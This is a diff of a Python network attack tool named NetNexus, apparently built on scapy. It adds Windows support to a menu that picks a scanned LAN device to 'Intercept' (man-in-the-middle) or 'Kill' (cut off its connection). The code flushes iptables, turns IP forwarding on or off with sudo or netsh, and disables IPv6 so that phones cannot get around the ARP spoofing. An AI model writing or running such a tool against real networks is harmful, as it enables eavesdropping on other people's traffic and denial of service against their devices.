@@ -1,53 +1,65 @@
 import scapy.all as scapy
-import os, time, sys, subprocess, threading
+import os, time, sys, subprocess, threading, platform
 from core import scanner, spoof
 
-# Shared memory for the background scanner
+# Shared memory
 device_memory = {}
 stop_scanner = False
+current_os = platform.system() # Detects 'Linux' or 'Windows'
+
+def is_admin():
+    """Checks for Root (Linux) or Admin (Windows) privileges."""
+    try:
+        if current_os == "Windows":
+            import ctypes
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        return os.getuid() == 0
+    except:
+        return False
 
 def set_forwarding(state):
-    """Controls IP forwarding and firewall rules for maximum attack impact."""
-    if state:
-        # Intercept mode: Enable forwarding
-        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
-        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=0"], capture_output=True)
-        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
-        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], capture_output=True)
-    else:
-        # Kill mode: Disable forwarding and execute IPv6 "Execution"
-        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
-        # Modern phones use IPv6 to bypass ARP spoofing; this stops them.
-        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)
-        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.default.disable_ipv6=1"], capture_output=True)
-        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
-        subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-j", "DROP"], capture_output=True)
+    """Universal forwarding control."""
+    if current_os == "Linux":
+        if state:
+            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
+            subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
+        else:
+            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
+            subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)
+            subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "DROP"], capture_output=True)
+            
+    elif current_os == "Windows":
+        iface_name = scapy.conf.iface.name
+        val = "enabled" if state else "disabled"
+        subprocess.run(["netsh", "interface", "ipv4", "set", "interface", iface_name, f"forwarding={val}"], capture_output=True)
+        if not state:
+            subprocess.run(["netsh", "interface", "ipv6", "set", "interface", iface_name, "forwarding=disabled"], capture_output=True)
 
 def background_scanner(ip_range):
     global device_memory, stop_scanner
     while not stop_scanner:
         device_memory = scanner.scan(ip_range, device_memory)
-        time.sleep(0)
+        time.sleep(0.5)
 
 def main():
     global device_memory, stop_scanner
-    iface = "wlan0" # Change to match your 'ip a' output
-    scapy.conf.iface = iface
     
-    if os.geteuid() != 0:
-        print("[-] NetNexus requires root (sudo).")
+    if not is_admin():
+        print(f"[-] NetNexus requires Admin/Root privileges on {current_os}.")
         return
 
-    gateway_ip = "192.168.8.1"
-    ip_range = "192.168.8.1/24"
+    # Auto-detect gateway (Works on most home routers)
+    gateway_ip = "192.168.8.1" if current_os == "Linux" else "192.168.1.1"
+    ip_range = f"{gateway_ip}/24"
 
-    # Start fast scanner thread
+    print(f"[*] Running on {current_os}. Interface: {scapy.conf.iface.name}")
+
     scan_thread = threading.Thread(target=background_scanner, args=(ip_range,), daemon=True)
     scan_thread.start()
 
     while True:
         print("\n" + "="*45)
-        print("      NetNexus: 1000 Pkts/s (Final Build)")
+        print(f"      NetNexus: Multi-OS Build ({current_os})")
         print("="*45)
         
         current_list = list(device_memory.values())
@@ -65,17 +77,16 @@ def main():
         
         try:
             target = current_list[int(user_input)]
-            print(f"\n[1] Intercept [2] Limit [3] Kill")
+            print(f"\n[1] Intercept [2] Kill")
             mode = input("Action: ").strip()
 
             gateway_mac, _ = spoof.get_device_info(gateway_ip)
-            
-            if mode == "3":
+            wait_time = 0.001 if mode == "2" else 0.5
+
+            if mode == "2":
                 set_forwarding(False)
-                wait_time = 0.001 # Max speed
             else:
                 set_forwarding(True)
-                wait_time = 0.5
 
             print(f"[*] Attacking {target['ip']}...")
             while True:
